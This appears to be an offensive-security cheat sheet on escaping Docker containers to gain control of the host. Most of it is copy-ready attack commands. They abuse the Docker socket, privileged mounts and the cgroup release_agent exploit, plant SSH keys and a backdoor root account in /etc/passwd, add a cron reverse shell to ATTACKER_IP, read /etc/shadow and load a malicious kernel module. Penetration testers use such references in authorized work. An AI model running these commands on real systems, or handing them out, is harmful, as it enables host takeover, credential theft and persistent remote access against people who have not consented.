# Container Breakout & Escape Techniques

Techniques for escaping Docker containers, exploiting misconfigurations, and breaking out of
container isolation to reach the host.

---

## Quick Detection: Am I in a Container?

```bash
# Definitive checks
ls -la /.dockerenv 2>/dev/null && echo "Docker"
cat /proc/1/cgroup 2>/dev/null | grep -qiE 'docker|kubepods|containerd' && echo "Container"
cat /proc/self/mountinfo | grep -q 'overlay' && echo "OverlayFS (likely container)"

# Environment clues
env | grep -iE 'kubernetes|docker|container'
hostname  # random hex = Docker, <pod-name> = k8s

# What capabilities do I have?
cat /proc/self/status | grep -i capeff
# CapEff: 00000000a80425fb = restricted
# CapEff: 0000003fffffffff = privileged (nearly all caps)

# capsh for human-readable output
capsh --print 2>/dev/null
```

---

## 1. Docker Socket Mount

If `/var/run/docker.sock` is mounted into the container, you have full control of the Docker
daemon on the host - effectively root.

```bash
# Check
ls -la /var/run/docker.sock 2>/dev/null

# If docker CLI is available
docker run -v /:/host --rm -it alpine chroot /host bash

# If only curl is available (Docker API directly)
curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json | head -20

# Create privileged container mounting host root
curl -s --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host"}],"Privileged":true}' \
  http://localhost/containers/create

# Start the container (use ID from response)
curl -s --unix-socket /var/run/docker.sock -X POST http://localhost/containers/<ID>/start
```

Also check for TCP-exposed Docker API (unauthenticated):
```bash
curl -s http://HOST_IP:2375/version 2>/dev/null
curl -s http://HOST_IP:2376/version 2>/dev/null
```

---

## 2. Privileged Container Escape

If running with `--privileged` or all capabilities, the container has nearly full host access.

### Detection

```bash
ip link add dummy0 type dummy 2>/dev/null && echo "PRIVILEGED" && ip link del dummy0
# Unprivileged containers can't create network interfaces

# Or check capabilities
grep CapEff /proc/self/status
# 0000003fffffffff = all caps = privileged
```

### Escape via Host Disk Mount

```bash
# List host block devices
fdisk -l 2>/dev/null || lsblk

# Mount host root filesystem
mkdir -p /mnt/host
mount /dev/sda1 /mnt/host   # adjust device as needed

# Add SSH key to host root
echo 'YOUR_SSH_KEY' >> /mnt/host/root/.ssh/authorized_keys

# Or add root user to host
echo 'pwned:$6$xyz$HASH:0:0:root:/root:/bin/bash' >> /mnt/host/etc/passwd

# Or write cron job on host
echo '* * * * * root bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /mnt/host/etc/crontab
```

### Escape via Kernel Module

```bash
# If SYS_MODULE capability is present
# Compile kernel module on attacker, load on target
insmod /tmp/evil.ko
```

### Escape via /proc/sysrq-trigger

```bash
# With privileged access, can trigger kernel functions
echo b > /proc/sysrq-trigger  # CAUTION: reboots the host
```

---

## 3. Capability-Based Escape

### SYS_ADMIN - cgroup v1 release_agent (CVE-2022-0492)

The classic container escape. Requires cgroup v1 and SYS_ADMIN capability.

```bash
# Check cgroup version
stat -f -c %T /sys/fs/cgroup/  # tmpfs = v1, cgroup2fs = v2

# Escape via release_agent
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p "$d/w"
echo 1 > "$d/w/notify_on_release"
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > "$d/release_agent"

# Write payload
echo '#!/bin/sh' > /cmd
echo 'cat /etc/shadow > /output' >> /cmd  # or reverse shell
chmod +x /cmd

# Trigger
sh -c "echo \$\$ > $d/w/cgroup.procs"
cat /output
```

cgroup v2 does NOT have `release_agent` - this escape doesn't work on cgroup v2 systems.

### SYS_PTRACE - Process Injection

```bash
# Find a host process (if host PID namespace is shared)
ps aux | grep root

# Inject shellcode via ptrace
# Use a tool like linux-inject or manual ptrace calls
```

### DAC_READ_SEARCH - Shocker Exploit

Bypasses filesystem read permissions. Can read any file on the host if the host filesystem
is accessible via /proc or mounted paths.

```bash
# If open_by_handle_at is available (DAC_READ_SEARCH)
# Use the shocker.c exploit to read host files
```

### NET_ADMIN + NET_RAW

```bash
# ARP spoofing, packet capture, network manipulation
tcpdump -i eth0 -w /tmp/capture.pcap
# Can sniff credentials from adjacent containers or host network
```

---

## 4. Host Mount Exploitation

If host paths are bind-mounted into the container:

```bash
# Check what's mounted from the host
mount | grep -E '^/dev/' | grep -v overlay
cat /proc/self/mountinfo | grep -v overlay

# Common targets
ls -la /host/ /mnt/ /hostfs/ 2>/dev/null

# If /etc from host is mounted
cat /host/etc/shadow
echo 'pwned:$6$xyz$HASH:0:0:root:/root:/bin/bash' >> /host/etc/passwd

# If host Docker data dir is mounted
ls /var/lib/docker/volumes/
```

---

## 5. Docker Group Membership

If the user is in the `docker` group, they can control Docker = effectively root on the host.

```bash
# Check
id | grep docker

# Escape
docker run -v /:/host --rm -it alpine chroot /host bash
```

Not technically a "container escape" but commonly found during Linux privesc enumeration.

---

## 6. Runtime CVEs

| CVE | Component | Impact | Versions Affected |
|-----|-----------|--------|-------------------|
| CVE-2024-21626 | runc (Leaky Vessels) | Container escape via leaked fd to host | runc < 1.1.12 |
| CVE-2025-31133 | runc | Escape via os.MkdirAll race | runc < 1.2.6 |
| CVE-2024-23651 | BuildKit | Race condition in mount cache | BuildKit < 0.12.5 |
| CVE-2024-23652 | BuildKit | Arbitrary deletion via mount | BuildKit < 0.12.5 |
| CVE-2024-23653 | BuildKit | Privilege check bypass in build | BuildKit < 0.12.5 |
| CVE-2024-1753 | Podman/Buildah | Symlink escape during build | Podman < 4.9.4 |
| CVE-2024-24557 | Docker/Moby | Build cache poisoning | Docker < 25.0.2 |
| CVE-2022-0492 | Linux kernel | cgroup v1 release_agent escape | kernel < 5.17 |

### CVE-2024-21626 (Leaky Vessels) Details

runc process leaked a file descriptor to the host filesystem. Attacker could use
`/proc/self/fd/<N>` to traverse to the host root. Fixed in runc 1.1.12.

```bash
# Check runc version
runc --version 2>/dev/null
docker info 2>/dev/null | grep -i runc
```

---

## 7. Namespace Escape

### nsenter (if host PID namespace is shared)

```bash
# If hostPID: true (--pid=host)
nsenter -t 1 -m -u -i -n -p - /bin/bash
# This enters all namespaces of PID 1 (host init process)
```

### /proc/1/root (if host PID namespace is shared)

```bash
# Access host root filesystem via PID 1's root
ls /proc/1/root/
cat /proc/1/root/etc/shadow
```

---

## 8. Container Enumeration Tools

### CDK (Container pentest toolkit)

```bash
# Run evaluation
./cdk evaluate

# Auto-escape attempt
./cdk auto-escape
```

### deepce (Docker enumeration)

```bash
curl -sL https://github.com/stealthcopter/deepce/raw/main/deepce.sh -o /tmp/deepce.sh
chmod +x /tmp/deepce.sh && /tmp/deepce.sh
```

### amicontained

```bash
# Check container runtime, capabilities, seccomp profile
./amicontained
```
